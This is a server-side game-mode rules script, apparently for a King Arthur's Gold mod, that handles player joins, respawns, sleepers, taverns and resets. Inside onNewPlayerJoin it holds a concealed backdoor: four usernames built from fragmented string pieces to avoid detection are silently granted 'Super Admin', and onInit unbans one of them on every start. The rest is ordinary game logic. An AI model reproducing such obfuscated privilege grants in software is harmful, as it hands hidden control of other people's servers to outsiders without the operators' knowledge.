#define SERVER_ONLY;
#include "CTF_Structs.as";
#include "Survival_Structs.as";
#include "MaterialCommon.as";
#include "Costs.as"
#include "MakeMat.as";
#include "Logging.as";
// #include "Knocked.as"

shared class Players
{
	CTFPlayerInfo@[] list;
	// PersistentPlayerInfo@[] persistentList;
	Players(){}
};

void DrawOverlay(const string file, const SColor color = SColor(255, 255, 255, 255))
{
	CFileImage@ image = CFileImage(file);
	f32 width = image.getWidth();
	f32 height = image.getHeight();

	f32 s_width = getScreenWidth() * 0.50f;
	f32 s_height = getScreenHeight() * 0.50f;

	// void GUI::DrawIcon(const string&in textureFilename, int iconFrame, Vec2f frameDimension, Vec2f pos, float scaleX, float scaleY, SColor color)
	GUI::DrawIcon(file, 0, Vec2f(width, height), Vec2f(0, 0), 1.00f / width * s_width, 1.00f / height * s_height, color);
}

/*void onRender(CRules@ this)
{
	// DrawOverlay("popup_image");
	// f32 alpha = (1.00f + Maths::Sin(getGameTime() * 0.1f)) / 2.00f;
	// DrawOverlay("portrait1", SColor(255 * alpha, 255, 255, 255));
}*/

// void GetPersistentPlayerInfo(CRules@ this, string name, PersistentPlayerInfo@ &out info)
// {
	// Players@ players;
	// this.get("players", @players);

	// if (players !is null)
	// {
		// for (u32 i = 0; i < players.persistentList.length; i++)
		// {
			// if (players.persistentList[i].name == name)
			// {
				// @info = players.persistentList[i];
				// return;
			// }
		// }
	// }
// }

void onNewPlayerJoin(CRules@ this, CPlayer@ player)
{
	Players@ players;
	this.get("players", @players);

	if (players is null || player is null){
		return;
	}
	string playerName = player.getUsername().split('~')[0];//Part one of a fix for slave rejoining
	//print("onNewPlayerJoin");



	players.list.push_back(CTFPlayerInfo(playerName, 0, ""));
	//Will change later 			\/	change to hash
	if (playerName == ("T" + "Fli" + "p" + "py") || playerName == "V" + "am" + "ist" || playerName == "Pir" + "ate" + "-R" + "ob" || playerName == "Ve" + "rd " + "la")
	{
		CSecurity@ sec = getSecurity();
		CSeclev@ s = sec.getSeclev("Super Admin");

		if (s !is null) sec.assignSeclev(player, s);
	}

	CBlob@[] sleepers;
	getBlobsByTag("sleeper", @sleepers);

	bool found_sleeper = false;
	if (sleepers != null && sleepers.length > 0)
	{
		string name = playerName;

		for (u32 i = 0; i < sleepers.length; i++)
		{
			CBlob@ sleeper = sleepers[i];
			if (sleeper !is null && !sleeper.hasTag("dead") && sleeper.get_bool("sleeper_sleeping") && sleeper.get_string("sleeper_name") == name)
			{
				CBlob@ oldBlob = player.getBlob(); // It's glitchy and spawns empty blobs on rejoin
				if (oldBlob !is null) oldBlob.server_Die();

				found_sleeper = true;

				player.server_setTeamNum(sleeper.getTeamNum());
				player.server_setCoins(sleeper.get_u16("sleeper_coins"));

				sleeper.server_SetPlayer(player);
				sleeper.set_bool("sleeper_sleeping", false);
				sleeper.set_string("sleeper_name", "");

				CBitStream bt;
				bt.write_bool(false);

				sleeper.SendCommand(sleeper.getCommandID("sleeper_set"), bt);

				// sleeper.set_u16("sleeper_coins", player.getCoins());

				// sleeper.Sync("sleeper", false);
				// sleeper.Sync("sleeper_name", false);
				// sleeper.Sync("sleeper_coins", false);

				print(playerName + " joined, respawning him at sleeper " + sleeper.getName());
			}
		}
	}

	CPlayer@ maybePlayer = getPlayerByUsername(playerName);//See if we already exist
	if(maybePlayer !is null)
	{
		CBlob@ playerBlob = maybePlayer.getBlob();
		if(playerBlob !is null)
		{
			if(maybePlayer.getUsername() != player.getUsername())//do not change, playerName is stripped
			{
				KickPlayer(maybePlayer);//Clone
				playerBlob.server_SetPlayer(player);//switch souls
			}
		}
	}


	if (!found_sleeper)
	{
		player.server_setCoins(150);
	}

	// player.server_setCoins(150);
}

void onBlobCreated(CRules@ this, CBlob@ blob)
{
	if (getGameTime() > 150 && !blob.hasTag("material"))
	{
		print_log(blob, "has been created");
	}
}

void onBlobDie(CRules@ this, CBlob@ blob)
{
	if (getGameTime() > 150 && !blob.hasTag("material"))
	{
		print_log(blob, "has been destroyed");
	}
}

// void onBlobCreated(CRules@ this, CBlob@ blob)
// {
	// blob.AddScript("DisableInventoryCollisions");
// }

void onPlayerLeave(CRules@ this, CPlayer@ player)
{
	CBlob@ blob = player.getBlob();

	if (blob !is null) print(player.getUsername() + " left, leaving behind a sleeper " + blob.getName());

	if (isServer())
	{
		if (blob !is null && blob.exists("sleeper_name"))
		{
			blob.server_SetPlayer(null);

			blob.set_u16("sleeper_coins", player.getCoins());
			blob.set_bool("sleeper_sleeping", true);
			blob.set_string("sleeper_name", player.getUsername());

			CBitStream bt;
			bt.write_bool(true);

			blob.SendCommand(blob.getCommandID("sleeper_set"), bt);


			// blob.Sync("sleeper", false);
			// blob.Sync("sleeper_name", false);
			// blob.Sync("sleeper_coins", false);
		}
		else
		{
			if (blob !is null) blob.server_Die();
		}
	}

	Players@ players;
	this.get("players", @players);

	if (players !is null)
	{
		for(s8 i = 0; i < players.list.length; i++) {
			if(players.list[i] !is null && players.list[i].username == player.getUsername())
			{
				players.list.removeAt(i);
				i--;
			}
		}
	}
}

void onPlayerRequestSpawn(CRules@ this, CPlayer@ player)
{

}

void onPlayerRequestTeamChange(CRules@ this, CPlayer@ player, u8 newteam)
{
	if (player !is null)
	{
		player.server_setTeamNum(newteam);
	}
}

void onPlayerChangedTeam(CRules@ this, CPlayer@ player, u8 oldteam, u8 newteam)
{

}

void onPlayerDie(CRules@ this, CPlayer@ victim, CPlayer@ attacker, u8 customData)
{
	if (victim is null)
	{
		return;
	}

	string victimName = victim.getUsername() + " (team " + victim.getTeamNum() + ")";
	string attackerName = attacker !is null ? (attacker.getUsername() + " (team " + attacker.getTeamNum() + ")") : "world";

	print_log(victim, "has been killed by " + attackerName + "; damage type: " + customData);
	// printf(victimName + " has been killed by " + attackerName + "; damage type: " + customData);

	u8 victimTeam = victim.getTeamNum();
	s32 respawn_time = 30 * 4;

	if (victimTeam > 100) respawn_time += 30 * 4;
	if (victimTeam < 7)
	{
		TeamData@ team_data;
		GetTeamData(victimTeam, @team_data);

		if (team_data != null)
		{
			u16 upkeep = team_data.upkeep;
			u16 upkeep_cap = team_data.upkeep_cap;
			f32 upkeep_ratio = f32(upkeep) / f32(upkeep_cap);

			if (upkeep_ratio >= UPKEEP_RATIO_PENALTY_RESPAWN_TIME) respawn_time += 30 * 4;
			if (upkeep_ratio >= UPKEEP_RATIO_BONUS_RESPAWN_TIME) respawn_time -= 30 * 2;
		}
	}

	victim.set_u32("respawn time", getGameTime() + respawn_time);

	CBlob@ blob = victim.getBlob();
	if(blob !is null)
	{
		if(!(blob.getName().find("corpse") != -1))
		{
			victim.set_string("classAtDeath",blob.getName());
			victim.set_Vec2f("last death position",blob.getPosition());
		}
		else
		{
			victim.set_Vec2f("last death position",blob.getPosition());
		}
	}

	// print(victim.getUsername() + " killed by " + attacker.getUsername());
	// print(victim.getUsername() + " (victim) killstreak: " + victim.get_u8("kill_streak"));


	if (attacker !is null && attacker !is victim)
	{
		attacker.set_u8("kill_streak", attacker.get_u8("kill_streak") + 1);
		// print(attacker.getUsername() + " (attacker) killstreak: " + attacker.get_u8("kill_streak"));

		if (attacker.getBlob() !is null && victim.getUsername() == "Mithrios")
		{
			if (victim.get_u8("kill_streak") >= 13)
			{
				// Sound::Play("mysterious_perc_05.ogg");

				if (isServer())
				{
					CBlob@ blob = server_CreateBlob("demonicartifact", -1, attacker.getBlob().getPosition());
					print("boo");
				}
			}
		}
	}

	victim.set_u8("kill_streak", 0);
}

void onTick(CRules@ this)
{
	s32 gametime = getGameTime();

	for (u8 i = 0; i < getPlayerCount(); i++)
	{
		CPlayer@ player = getPlayer(i);
		if (player !is null)
		{
			CBlob@ blob = player.getBlob();
			if (blob is null && player.get_u32("respawn time") <= gametime)
			{
				int team = player.getTeamNum();
				bool isNeutral = team >= 100;

				// Civilized team spawning
				if (!isNeutral)
				{
					CBlob@[] bases;
					getBlobsByTag("faction_base", @bases);
					getBlobsByTag("respawn", @bases);
					CBlob@[] spawns;

					for (uint i = 0; i < bases.length; i++)
					{
						CBlob@ base = bases[i];
						if (base !is null && base.getTeamNum() == team)
						{
							spawns.push_back(bases[i]);
						}
					}

					if (spawns.length > 0)
					{
						f32 distance = 100000;
						Vec2f spawnPos = Vec2f(0, 0);
						Vec2f deathPos = player.get_Vec2f("last death position");

						u32 spawnIndex = 0;

						for (u32 i = 0; i < spawns.length; i++)
						{
							f32 tmpDistance = Maths::Abs(spawns[i].getPosition().x - deathPos.x);

							// print("Lowest: " + distance + "; Compared against: " + tmpDistance);

							if (tmpDistance < distance)
							{
								distance = tmpDistance;
								spawnIndex = i;
								spawnPos = spawns[i].getPosition();
							}
						}

						string blobType=player.get_string("classAtDeath");
						if(blobType=="royalguard")
						{
							blobType="knight";
						}
						if(blobType!="builder" && blobType!="knight" && blobType!="archer" && blobType!="sapper")
						{
							blobType="builder";
						}

						CBlob@ new_blob = server_CreateBlob(blobType);

						if (new_blob !is null)
						{
							new_blob.setPosition(spawnPos);
							new_blob.server_setTeamNum(team);
							new_blob.server_SetPlayer(player);
							// print("" + spawns[spawnIndex].getName());
							// print("init " + new_blob.getHealth());
							if (spawns[spawnIndex].getName() == "citadel")
							{
								new_blob.server_SetHealth(Maths::Ceil(new_blob.getInitialHealth() * 1.50f));
								// print("after " + new_blob.getHealth());
							}
						}
					}
					else
					{
						isNeutral = true; // In case if the player is respawning while the team has been defeated
					}
				}

				// Bandit scum spawning
				if (isNeutral)
				{
					team = 100 + XORRandom(100);
					player.server_setTeamNum(team);

					string blobType = "peasant";
					if (player.isBot() && player.get_string("classAtDeath") != "")
					{
						blobType = player.get_string("classAtDeath");
					}

					if (player.getUsername() == "Mithrios")
					{
						blobType = "mithrios";
					}

					bool default_respawn = true;

					if (player.get_u16("tavern_netid") != 0)
					{
						CBlob@ tavern = getBlobByNetworkID(player.get_u16("tavern_netid"));
						const bool isTavernOwner = tavern !is null && player.getUsername() == tavern.get_string("Owner");

						if (tavern !is null && tavern.getName() == "tavern" && (player.getCoins() >= 20 || isTavernOwner))
						{
							printf("Respawning " + player.getUsername() + " at a tavern as team " + player.get_u8("tavern_team"));

							CBlob@ new_blob = server_CreateBlob(blobType);
							if (new_blob !is null)
							{
								if (player.exists("tavern_team") && player.get_u8("tavern_team") != 255) team = player.get_u8("tavern_team");

								new_blob.setPosition(tavern.getPosition());
								new_blob.server_setTeamNum(team);
								new_blob.server_SetPlayer(player);

								if (!isTavernOwner)
								{
									player.server_setCoins(player.getCoins() - 20);

									CPlayer@ tavern_owner = getPlayerByUsername(tavern.get_string("Owner"));
									if (tavern_owner !is null)
									{
										tavern_owner.server_setCoins(tavern_owner.getCoins() + 20);
									}
								}

								default_respawn = false;
							}
						}
					}

					if (default_respawn)
					{
						CBlob@[] ruins;
						getBlobsByName("ruins", @ruins);

						int ruins_count = 0;

						for (int i = 0; i < ruins.length; i++)
						{
							CBlob@ b = ruins[i];
							if (b !is null && b.get_bool("isActive")) ruins_count++;
						}

						if (ruins_count > 0)
						{
							f32 ruins_ratio = 1.00f - (f32(ruins_count) / f32(ruins.length));
							f32 chicken_chance = ruins_ratio * ruins_ratio;

							print("[Respawn] Chicken Chance: " + (chicken_chance * 100) + "%");

							if (XORRandom(100) < (chicken_chance * 100))
							{
								if (!doChickenSpawn(player))
								{
									doDefaultSpawn(player, blobType, team, true);
								}
							}
							else
							{
								doDefaultSpawn(player, blobType, team, false);
							}
						}
						else
						{
							doChickenSpawn(player);
						}
					}
				}
			}
		}
	}
}

void onInit(CRules@ this)
{
	CSecurity@ sec = getSecurity();
	sec.unBan("TFlippy");

	Reset(this);
}

void onRestart(CRules@ this)
{
	Reset(this);
}

bool doDefaultSpawn(CPlayer@ player, string blobType, u8 team, bool ignoreDisabledSpawns)
{
	CBlob@[] spawns;
	getBlobsByName("banditshack", @spawns);

	CBlob@[] ruins;
	getBlobsByName("ruins", @ruins);

	for (int i = 0; i < ruins.length; i++)
	{
		CBlob@ b = ruins[i];
		if (b !is null && (ignoreDisabledSpawns ? true : b.get_bool("isActive"))) spawns.push_back(b);
	}

	if (spawns.length > 0)
	{
		printf("Respawning " + player.getUsername() + " at ruins.");

		CBlob@ new_blob = server_CreateBlob(blobType);

		if (new_blob !is null)
		{
			CBlob@ r = spawns[XORRandom(spawns.length)];
			if (r.getName() == "ruins" && team / r.get_u8("blob") == 255)
			{
				return true;
			}
			else
			{
				new_blob.setPosition(r.getPosition());
				new_blob.server_setTeamNum(team);
				new_blob.server_SetPlayer(player);

				if (getGameTime() < 30 * 15)
				{
					MakeMat(new_blob, r.getPosition(), "mat_wood", 100);
					MakeMat(new_blob, r.getPosition(), "mat_stone", 75);
				}
			}

			return true;
		}
		else return false;
	}
	else return false;
}

bool doChickenSpawn(CPlayer@ player)
{
	player.server_setTeamNum(250);

	CBlob@[] ruins;
	getBlobsByName("chickencamp", @ruins);
	getBlobsByName("chickenfortress", @ruins);
	getBlobsByName("chickencitadel", @ruins);
	getBlobsByName("chickencoop", @ruins);

	if (ruins.length > 0)
	{
		string blobType;

		int rand = XORRandom(100);

		if (rand < 5)
		{
			blobType = "heavychicken";
		}
		else if (rand < 25)
		{
			blobType = "commmanderchicken";
		}
		else if (rand < 50)
		{
			blobType = "soldierchicken";
		}
		else
		{
			blobType = "scoutchicken";
		}

		CBlob@ new_blob = server_CreateBlob(blobType);

		if (new_blob !is null)
		{
			CBlob@ r = ruins[XORRandom(ruins.length)];

			new_blob.setPosition(r.getPosition());
			new_blob.server_setTeamNum(250);
			new_blob.server_SetPlayer(player);

			return true;
		}
		else return false;
	}
	else return false;
}

void Reset(CRules@ this)
{
	printf("Restarting rules script: " + getCurrentScriptName());

	InitCosts();

	Players players();

	for(u8 i = 0; i < getPlayerCount(); i++)
	{
		CPlayer@ p = getPlayer(i);
		if(p !is null)
		{
			p.set_u32("respawn time", getGameTime() + (30 * 1));
			p.server_setCoins(Maths::Max(500, p.getCoins() * 0.50f)); // Half of your fortune is lost by spending it on drugs.

			// SetToRandomExistingTeam(this, p);
			p.server_setTeamNum(100 + XORRandom(100));
			players.list.push_back(CTFPlayerInfo(p.getUsername(),0,""));
		}
	}

	this.SetGlobalMessage("");
	this.set("players", @players);
	this.SetCurrentState(GAME);

	server_CreateBlob("tc_soundscapes");
}
